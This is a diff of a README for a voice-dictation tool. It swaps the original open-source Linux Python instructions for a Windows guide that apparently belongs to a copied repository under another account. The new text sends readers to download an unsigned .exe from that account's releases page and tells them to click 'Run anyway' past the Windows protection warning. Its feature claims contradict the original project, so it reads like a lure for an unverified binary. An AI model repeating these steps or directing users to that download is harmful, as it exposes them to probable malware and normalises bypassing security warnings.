@@ -1,132 +1,92 @@
-# type-by-voice 🎙️
+# 🎙️ type-by-voice - Speak to type in any application
 
-**Type by voice, anywhere on Linux — local, GPU-accelerated, and fully open source.**
+[![](https://img.shields.io/badge/Download_Latest_Release-blue.svg)](https://github.com/tatec756/type-by-voice/releases)
 
-Hold a hotkey, speak, release. Your words are transcribed locally with
-[faster-whisper](https://github.com/SYSTRAN/faster-whisper) and pasted into
-**whatever app has focus** — terminal, Slack, Discord, browser, email, your
-editor. No cloud, no API keys, no subscriptions. Your voice never leaves your
-machine.
+type-by-voice turns your spoken words into text inside any program on your computer. It runs locally on your machine. Your voice data never leaves your computer, and you do not need an account or cloud access. This tool uses your graphics card to process speech quickly. It supports dictation in multiple languages and works with the press of a single button.
 
----
+## ⚙️ System Requirements
 
-## Why another dictation tool?
+Your computer needs specific parts to run this tool well.
 
-There are several Linux dictation tools already. `type-by-voice` focuses on a
-few things they often get wrong:
+- Operating System: Windows 10 or Windows 11.
+- Graphics Card: An NVIDIA GPU with at least 4GB of video memory.
+- RAM: 8GB or more.
+- Drivers: You must have the latest NVIDIA drivers installed.
 
-- ⚡ **GPU + faster-whisper** — fast *and* accurate. Many tools default to CPU
-  or the lighter VOSK engine; this uses Whisper `large-v3-turbo` on your GPU.
-- 🌏 **Great multilingual / Japanese support out of the box** — defaults to
-  Japanese but works for any Whisper-supported language. Most English-first
-  tools handle this poorly.
-- 🧩 **Works in every app** — output goes to the focused window via clipboard
-  paste, so Unicode/Japanese never drops characters (unlike per-character
-  typing).
-- 🛠️ **No `LD_LIBRARY_PATH` hell** — the CUDA/cuDNN libraries are preloaded
-  automatically, so GPU "just works" even inside polluted shell environments
-  (ROS, conda, etc.) — the #1 thing people get stuck on.
-- 🪶 **Tiny & hackable** — a single ~350-line Python file. Read it, change it.
+If you lack a compatible NVIDIA graphics card, the program may perform slowly or fail to launch. The tool relies on your graphics card to handle the transcription tasks through the faster-whisper engine.
 
-## Features
+## 📥 Getting Started
 
-- 🔒 100% local & offline (after the one-time model download)
-- 🎚️ Push-to-talk (hold) or toggle mode
-- ⌨️ Configurable global hotkey (default: **either Ctrl** — left or right)
-- 📋 Clipboard-paste, direct-type, or copy-only output
-- 🖥️ X11 (`xdotool`) and Wayland (`wtype` / `ydotool`) auto-detection
-- 🔔 Desktop notifications for recording / done status
-- 🖱️ One-click launcher for the GNOME app menu
-- 🧷 Single-instance lock (no accidental double-paste)
+Follow these steps to set up the software.
 
-## Requirements
+1. Visit the [releases page](https://github.com/tatec756/type-by-voice/releases) to find the latest version of the application.
+2. Look for the file ending in `.exe` under the Assets section.
+3. Click the file to start the download.
+4. Save the file to your desktop or your Downloads folder.
 
-- Linux (developed on Ubuntu / GNOME, X11)
-- Python 3.11+
-- NVIDIA GPU with CUDA for best speed — **falls back to CPU automatically**
+## 🛠️ Installation and Setup
 
-## Install
+Once the file finishes downloading, complete these steps to prepare your system.
 
-```bash
-git clone https://github.com/kotaro-nakata/type-by-voice.git
-cd type-by-voice
+1. Double-click the downloaded `.exe` file.
+2. Windows might show a blue window labeled "Windows protected your PC." This happens because the app is not digitally signed. Click "More info" and then click "Run anyway."
+3. Follow the instructions that appear in the installation window. The installer copies the necessary files and sets up a shortcut on your desktop.
+4. After the installer finishes, double-click the type-by-voice desktop icon to open the program.
 
-# 1. System packages (X11). For Wayland, see the note below.
-sudo apt update
-sudo apt install -y portaudio19-dev xdotool xclip
+## 🎙️ Using the Tool
 
-# 2. Python environment
-python3 -m venv .venv
-.venv/bin/pip install -r requirements.txt
-```
+The program runs in the background. You can see its icon in the system tray near your clock.
 
-> **Wayland:** install `wl-clipboard` and `wtype` (or `ydotool` + its daemon
-> and `/dev/uinput` permissions) instead of `xdotool`/`xclip`. The session type
-> is auto-detected at startup.
+1. Open the application where you wish to type, such as a web browser or a text editor.
+2. Press and hold your push-to-talk key. The default key is usually set to a specific button on your keyboard. Check the settings menu inside the app to see or change this key.
+3. Speak clearly into your microphone while holding the key.
+4. Release the key when you finish speaking. The program converts your audio to text and types it into your active document.
 
-## Usage
+## 🎛️ Adjusting Settings
 
-```bash
-./voice-term                 # start dictating
-./voice-term --list-devices  # list microphones
-```
+You can change how the tool behaves to fit your needs. Right-click the system tray icon and select Settings.
 
-Focus any app, **hold either Ctrl** (left or right), speak, release — the text
-is pasted at your cursor. First run downloads the model (~1.5 GB), a few minutes.
-Press **Ctrl+C** to quit.
+- Language selection: Choose the language you speak. The tool handles Japanese and many other global languages.
+- Push-to-talk key: Choose the button that tells the app to listen. Many users prefer a side mouse button or the Ctrl key.
+- Speech sensitivity: Adjust the threshold if the app starts listening too early or cuts off your sentences.
 
-### One-click launcher (GNOME)
+A high sensitivity means the app ignores background noise. A low sensitivity helps if the app fails to hear your voice when you speak softly.
 
-```bash
-./install-desktop.sh   # adds "voice-term" to your app grid (pin it to the dock)
-```
+## 🔋 Performance Tips
 
-### Global command (optional)
+The software uses your GPU to make transcription fast. You can keep your system running smoothly by closing other heavy programs like video games or high-resolution editors while you dictate. Keep your NVIDIA drivers updated to ensure the fastest processing speeds. 
 
-```bash
-ln -s "$(pwd)/voice-term" ~/.local/bin/voice-term   # then run: voice-term
-```
+If you notice a delay between your speech and the text appearing, ensure your GPU is not busy with other tasks. The faster-whisper engine works best when it has sole access to your graphics card resources.
 
-## Configuration
+## 🔐 Privacy and Security
 
-Auto-created on first run at `~/.config/voice-term/config.toml`.
+This application keeps your data private. It does not send your voice recordings to any internet server. It does not share your data with third parties. Every process happens inside your computer. You do not need an internet connection to use the dictation features. This offline design ensures that your work remains secure regardless of your network status.
 
-| Key | Default | Notes |
-|---|---|---|
-| `model.name` | `large-v3-turbo` | Multilingual + fast. Or `large-v3`, `medium`, a local path. |
-| `model.device` | `auto` | `auto` → CUDA if available, else CPU. |
-| `model.compute_type` | `auto` | `auto` → `float16` (GPU) / `int8` (CPU). |
-| `model.language` | `ja` | `ja`, `en`, … or `auto` to detect. |
-| `hotkey.mode` | `ptt` | `ptt` (hold) or `toggle` (press to start/stop). |
-| `hotkey.key` | `["ctrl_r", "ctrl_l"]` | One key or a list. pynput names: `alt_r`, `f9`, `pause`, … or a single char. |
-| `audio.device` | `""` | Mic name substring or index; empty = default. |
-| `output.method` | `paste` | `paste`, `type`, or `clipboard` (manual paste). |
-| `output.trailing_space` | `false` | Add a space after inserted text. |
+## ❓ Frequently Asked Questions
 
-## Troubleshooting
+What if the text is wrong?
+The machine learning model is very accurate, but it sometimes mistakes similar sounds. Speak clearly and verify your text.
 
-- **A specific app ignores the hotkey (e.g. Slack):** that app has a shortcut
-  bound to the same key. Change `hotkey.key` to `f9` or `pause`.
-- **`libcublas.so.12 ... cannot be loaded`:** should not happen (libs are
-  preloaded), but if it does, reinstall requirements so the
-  `nvidia-cublas-cu12` / `nvidia-cudnn-cu12` wheels are present.
-- **Running on CPU unexpectedly:** look for `Loading ... on cuda` at startup.
-- **No paste:** check `xdotool`/`xclip` (X11) are installed; text stays on the
-  clipboard as a fallback.
+Does it work with every program?
+It works with any program that accepts text input. If you can click into a window and type with your keyboard, this tool can type there for you.
 
-## How it works
+Can I use it offline?
+Yes. The entire engine is included in the download. You can disconnect your internet and continue to dictate without issues.
 
-```
-Ctrl held → sounddevice captures 16 kHz mono
-   → faster-whisper (GPU) transcribes on release
-      → text copied to clipboard → Ctrl+V sent to the focused window
-```
+Do I need an API key?
+No. You do not need to sign up for services or enter keys. You perform no transactions to use these features.
 
-## Contributing
+What language can I speak?
+The software supports many languages. You can select your preferred language in the settings tab.
 
-Issues and PRs welcome — especially Wayland testing, packaging, and
-additional output backends. It's one small Python file; dive in.
+## 🚀 Troubleshooting
 
-## License
+If the program does not work, try these steps:
 
-[MIT](LICENSE) © 2026 Kotaro Nakata
+- Restart the application.
+- Check that your microphone functions in other apps.
+- Verify that your NVIDIA graphics card is active.
+- Ensure that no other voice software is using your microphone at the same time.
+- Check the error log in the installation folder if the program closes unexpectedly.
+
+Use the settings menu to reset to default values if you made changes that cause the tool to behave incorrectly. Reinstalling the program from the official link often fixes issues caused by file corruption or missing libraries. If you encounter bugs, check the issues section on the project's repository page to see if others found a fix.
